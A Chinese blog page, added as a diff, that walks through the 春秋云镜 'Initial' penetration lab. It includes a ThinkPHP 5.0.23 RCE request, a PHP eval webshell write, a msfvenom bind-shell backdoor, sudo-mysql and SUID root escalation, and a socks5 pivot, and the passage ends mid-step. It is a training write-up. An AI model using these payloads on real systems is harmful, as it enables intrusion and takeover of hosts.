@@ -1,0 +1,1538 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Initial, Hexo">
+    <meta name="description" content="Initialflag1先用fscan扫一下
+./fscan  -h 39.99.138.127 -nobr(-nobr设置不爆破弱口令)
+
+
+172.22.1.15扫出来有poc-yaml-thinkphp5023-method-rce ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Initial | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Initial</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                <span class="chip bg-color">春秋云镜</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-08-04
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-26
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Initial"><a href="#Initial" class="headerlink" title="Initial"></a>Initial</h1><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>先用fscan扫一下</p>
+<pre class="line-numbers language-none"><code class="language-none">./fscan  -h 39.99.138.127 -nobr(-nobr设置不爆破弱口令)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a1b2e831814a8b69d9c33539ec6f9a20.png"></p>
+<h2 id="172-22-1-15"><a href="#172-22-1-15" class="headerlink" title="172.22.1.15"></a>172.22.1.15</h2><p>扫出来有poc-yaml-thinkphp5023-method-rce poc1</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/--kisaragi--/p/15315131.html">【RCE | BUUCTF】ThinkPHP 5.0.23 远程代码执行漏洞复现 - –Kisaragi– - 博客园</a></p>
+<pre class="line-numbers language-none"><code class="language-none">POST /index.php?s=captcha HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id #传入的参数
+
+echo '&lt;?php eval(\$_POST[cmd]); ?&gt;' &gt; /var/www/html/webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/33a037b8aecd71c4f6cbdcc00673d9d5.png"></p>
+<h4 id="msf连接"><a href="#msf连接" class="headerlink" title="msf连接"></a>msf连接</h4><p>但是蚁剑的shell不好用，用msf再建立一个连接，也方便后续流量转发。因为我们已知公网ip，于是用正向shell.</p>
+<p>先本地生成一个正向shell的64位后门</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7654 -f elf -o 7.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将<code>7.elf</code>拖到蚁剑上然后赋权</p>
+<pre class="line-numbers language-none"><code class="language-none">chmod +x 7.elf     +x 表示给所有用户（所有者、所属组、其他用户）添加可执行权限(777过就不用了)
+chmod +x filename（给所有用户添加执行权限）
+chmod u+x filename（只给所有者添加执行权限）
+chmod g+x filename（只给所属组添加执行权限）
+
+
+chmod 777 7.elf
+./7.elf
+
+777 是数字权限表示法，三个数字分别对应文件所有者、所属组用户和其他用户的权限
+每个数字的含义：4 代表读权限（r），2 代表写权限（w），1 代表执行权限（x）
+7 是 4+2+1 的总和，表示同时拥有读、写、执行三种权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着用msf即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler
+<span class="token comment">#加载 Metasploit 的 "多用途处理器" 模块，这是一个监听模块，用于接收来自#目标主机的反向连接或绑定连接。</span>
+<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp
+<span class="token comment">#设置攻击载荷（payload）为linux/x64/meterpreter/bind_tcp：</span>
+<span class="token comment">#linux/x64：针对 64 位 Linux 系统</span>
+<span class="token comment">#meterpreter：一种高级交互式 shell，提供文件操作、进程控制等功能</span>
+<span class="token comment">#bind_tcp：绑定连接模式（目标主机开放端口等待攻击者连接，与反向连接#reverse_tcp对应）</span>
+<span class="token builtin class-name">set</span> rhost <span class="token number">39.99</span>.138.127
+<span class="token comment">#设置rhost（远程主机）为目标 IP 地址，即要连接的受害主机 IP。</span>
+<span class="token builtin class-name">set</span> lport <span class="token number">4567</span>
+<span class="token comment">#在bind_tcp模式下，lport实际是目标主机开放的端口（攻击者将连接到该端口）。</span>
+run
+<span class="token comment">#执行监听，等待与目标主机的bind_tcp载荷建立连接，成功后获得 #meterpreter 会话。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即可创meterpreter 会话。</p>
+<p>传完后来拿flag.</p>
+<p>先</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l
+
+
+Matching Defaults entries for www-data on ubuntu-web01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User www-data may run the following commands on ubuntu-web01:
+    (root) NOPASSWD: /usr/bin/mysql
+    当前 www-data 用户在 ubuntu-web01 主机上拥有以下 sudo 权限：可以以 root 用户身份执行 /usr/bin/mysql 命令；NOPASSWD 标志表示执行该命令时不需要输入密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7c98e05d1c11fd31051aa146eed0a857.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo mysql -e '\! find / -name flag*'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<ol>
+<li><p>以 root 权限启动 MySQL 客户端（因为 <code>www-data</code> 用户有 NOPASSWD 权限执行 <code>mysql</code>）</p>
+</li>
+<li><p>在 MySQL 客户端中执行 <code>\!</code> 命令，这会调用系统 shell 执行后面的命令</p>
+</li>
+<li><p>实际执行的系统命令是 <code>find / -name flag*</code>（全局查找文件名以 flag 开头的文件）</p>
+</li>
+<li><p>在 MySQL 客户端中，<code>-e</code> 是执行命令的参数，用于在非交互式模式下运行 MySQL 命令并退出。</p>
+<p>而 <code>\!</code> 是 MySQL 客户端中的一个特殊命令，作用是<strong>执行系统 shell 命令</strong></p>
+</li>
+</ol>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c6d3a998cf84caba53627679ff7dc622.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo mysql -e '\! cat /root/flag/flag01.txt'
+
+
+flag{60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h5><p><code>sudo</code>（Superuser Do）是 Linux 系统中用于以其他用户身份（通常是 root 身份）执行命令的工具 ，其核心配置文件为 <code>/etc/sudoers</code> ，管理员可通过 <code>visudo</code> 命令（安全编辑该文件，可避免语法错误导致权限问题）进行权限分配。比如配置 <code>user1 ALL=(root) NOPASSWD: /usr/bin/apt-get</code> ，意味着用户 <code>user1</code> 无需输入密码，就能以 root 权限执行 <code>apt-get</code> 命令 。</p>
+<p>当发现某用户克用sudo运行某些命令，可以利用这些命令提权到root</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/vim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果vim可以用sudo运行，就能在vim里执行<code>:!sh</code>获取root shell</p>
+<h5 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h5><p>原理：SUID（Set User ID），是一种文件权限位，允许普通用户以文件拥有者（通常是 root）的身份执行该程序。SUID 权限标志为 s，例如 -rwsr - xr - x。只需执行程序，无需输入密码。</p>
+<p>利用方式：先查找系统中的 SUID 文件 find /-perm - 4000 2 &gt; /dev/null，</p>
+<p>如果某些程序（如 python、vim、perl、find、bash 等）具有 SUID，并且本身可逃逸为 shell，则普通用户运行时会直接获得 root 权限。比如，若 /usr/bin/vim 有 SUID 权限，你用普通用户运行 vim，执行 :!sh，就是 root shell；也可以利用 SUID 程序的漏洞提权（比如 SUID 的 C 程序有命令注入）。</p>
+<p>例如，系统中的 <code>/bin/passwd</code> 文件，其所有者是 root，并且设置了 SUID 权限。普通用户执行 <code>passwd</code> 命令来修改自己的密码时，实际上是以 root 权限来访问和修改 <code>/etc/shadow</code> 文件（该文件只有 root 用户才有读和写的权限） ，从而实现密码修改。</p>
+<p>检测方法:</p>
+<p>在 Linux 系统中，可以使用以下命令来查找设置了 SUID 权限的文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其中，<code>/</code> 表示从根目录开始查找；<code>-perm -u=s</code> 用于筛选出设置了 SUID 权限的文件；<code>-type f</code> 限定查找的对象是普通文件；<code>2&gt;/dev/null</code> 则是将错误信息（比如没有权限访问某些目录而产生的报错）重定向到 <code>/dev/null</code> ，即忽略错误信息。</p>
+<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><ul>
+<li><p>利用可逃逸为 shell 的程序</p>
+<p>：如果某些常见程序（如 <code>vim</code>、<code>find</code>、<code>bash</code>、<code>perl</code>、<code>python</code> 等）被设置了 SUID 权限，并且这些程序具备一定的特性，能让用户从中逃逸并获取到具有高权限的 shell，就可以实现提权。</p>
+<ul>
+<li><strong><code>vim</code> 示例</strong>：当 <code>/usr/bin/vim</code> 拥有 SUID 权限时，普通用户打开 vim，然后执行 <code>:!sh</code> ，就能得到一个 root 权限的 shell。这是因为 vim 在执行外部命令时，会继承自身的权限，而此时 vim 具有 root 的 SUID 权限，所以执行的 shell 也拥有 root 权限。</li>
+<li><strong><code>find</code> 示例</strong>：当 <code>find</code> 程序被设置了 SUID 权限，普通用户可以执行类似这样的命令 <code>find . -exec /bin/sh \; -quit</code> 。<code>find</code> 命令的 <code>-exec</code> 选项可以让它在找到的文件上执行指定的命令，这里执行 <code>/bin/sh</code> ，由于 <code>find</code> 具备 SUID 权限，从而得到 root 权限的 shell。</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>sudo 提权</th>
+<th>SUID 提权</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>配置</td>
+<td>由 /etc/sudcers 管理</td>
+<td>由文件权限（SUID 位）管理</td>
+</tr>
+<tr>
+<td>认证</td>
+<td>通常需要密码（或 NOPASSWD）</td>
+<td>不需要密码</td>
+</tr>
+<tr>
+<td>入口</td>
+<td>用 sudo 执行指定命令</td>
+<td>直接执行 SUID 程序</td>
+</tr>
+<tr>
+<td>灵活性</td>
+<td>sudoers 精细控制命令粒度</td>
+<td>SUID 只控制程序本身</td>
+</tr>
+<tr>
+<td>安全性</td>
+<td>更安全，日志健全</td>
+<td>一旦配置错误风险极大</td>
+</tr>
+<tr>
+<td>常见利用</td>
+<td>sudo 结合能逃逸的程序</td>
+<td>SUID 结合能逃逸的程序</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><pre class="line-numbers language-none"><code class="language-none">看一下网段
+ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
+        inet6 fe80::216:3eff:fe16:c270  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:16:c2:70  txqueuelen 1000  (Ethernet)
+        RX packets 697240  bytes 381845267 (381.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 534548  bytes 209973517 (209.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 35960  bytes 16528880 (16.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 35960  bytes 16528880 (16.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可看到是172.22.1.15。</p>
+<p>上传fscan</p>
+<pre class="line-numbers language-none"><code class="language-none">chmod +x fscan
+./fscan -h 172.22.1.0/24 &gt;mao.txt         (默认是在result.txt)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>在 <code>./fscan -h 172.22.1.0/24 &gt;mao.txt</code> 这个命令里，<code>172.22.1.0/24</code> 是一种<strong>CIDR（无类别域间路由，Classless Inter-Domain Routing）表示法</strong>，用于标识一个 IP 地址段 ，具体含义如下：</p>
+<p><code>172.22.1.0</code> 是这个网段的<strong>网络地址</strong> ，它是该网段的起始标识，在网络中代表这个特定的网络区域。</p>
+<p><code>/24</code> 表示子网掩码中<strong>二进制的 1 的位数</strong> 。在 IPv4 地址中，IP 地址由 32 位二进制数组成，子网掩码用于区分网络地址和主机地址 。</p>
+<ul>
+<li><p><strong>子网掩码换算</strong>：<code>/24</code> 意味着子网掩码中有 24 个 1，8 个 0 ，用点分十进制表示就是 <code>255.255.255.0</code> 。</p>
+</li>
+<li><p>可分配主机地址范围计算</p>
+<p>：</p>
+<ul>
+<li>对于 <code>172.22.1.0/24</code> 这个网段，网络地址是 <code>172.22.1.0</code> ，广播地址是通过将主机位全部置为 1 得到，即 <code>172.22.1.255</code> 。</li>
+<li>可用于分配给主机（如服务器、电脑、网络设备等）的 IP 地址范围是 <code>172.22.1.1</code> 到 <code>172.22.1.254</code> ，一共可以容纳 <code>2^(32 - 24) - 2 = 254</code> 个主机地址 。减去 2 是因为要去掉网络地址和广播地址，它们不能分配给具体的主机使用。</li>
+</ul>
+</li>
+</ul>
+<p>在 <code>fscan</code> 这款综合扫描工具中，使用 <code>172.22.1.0/24</code> ，就表示让 <code>fscan</code> 对 <code>172.22.1.1</code> 到 <code>172.22.1.254</code> 这个范围内的所有 IP 地址进行扫描 ，扫描结果会通过 <code>&gt;</code> 重定向到 <code>mao.txt</code> 文件中保存。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.1.2      is alive  DC域控
+(icmp) Target 172.22.1.21     is alive   MS17-010永恒之蓝
+(icmp) Target 172.22.1.15     is alive   本体
+(icmp) Target 172.22.1.18     is alive   信呼OA系统
+[*] Icmp alive hosts len is: 4
+172.22.1.18:445 open
+172.22.1.21:445 open
+172.22.1.2:445 open
+172.22.1.18:3306 open
+172.22.1.18:139 open
+172.22.1.21:139 open
+172.22.1.2:139 open
+172.22.1.18:135 open
+172.22.1.21:135 open
+172.22.1.2:135 open
+172.22.1.18:80 open
+172.22.1.15:80 open
+172.22.1.2:88 open
+172.22.1.15:8001 open
+172.22.1.15:22 open
+[*] alive ports len is: 15
+start vulscan
+[*] NetInfo 
+[*]172.22.1.2
+   [-&gt;]DC01
+   [-&gt;]172.22.1.2
+[*] NetInfo 
+[*]172.22.1.18
+   [-&gt;]XIAORANG-OA01
+   [-&gt;]172.22.1.18
+[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)
+[*] NetInfo 
+[*]172.22.1.21
+   [-&gt;]XIAORANG-WIN7
+   [-&gt;]172.22.1.21
+[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
+[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
+[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
+[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
+[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+已完成 15/15
+[*] 扫描结束,耗时: 15.122671303s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>后门端口从54522开始，流量转发端口从55555开始</p>
+</blockquote>
+<h3 id="socks5流量转发"><a href="#socks5流量转发" class="headerlink" title="socks5流量转发"></a>socks5流量转发</h3><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/tools/Stotaway-bin/Stotaway-bin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>用stowaway开一个stocks5服务。让ubuntu上的流量通过“stowaway”走到172.22.1.15，只要再配置好浏览器代理，我们就可以访问172.22.1.15同一内网下别的主机提供的web服务了。同理，蚁剑，msf等攻击流量也可以走socks5，攻击内网里其他主机。</p>
+<pre class="line-numbers language-none"><code class="language-none">topo
+use 0
+socks 12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这是在ubuntu开了123456的socks服务器，然后转发到0上，因此还需对浏览器/蚁剑/proxychains设置代理，将攻击流量转到12345端口。</p>
+<pre class="line-numbers language-none"><code class="language-none">vim /etc/proxychains4.conf
+
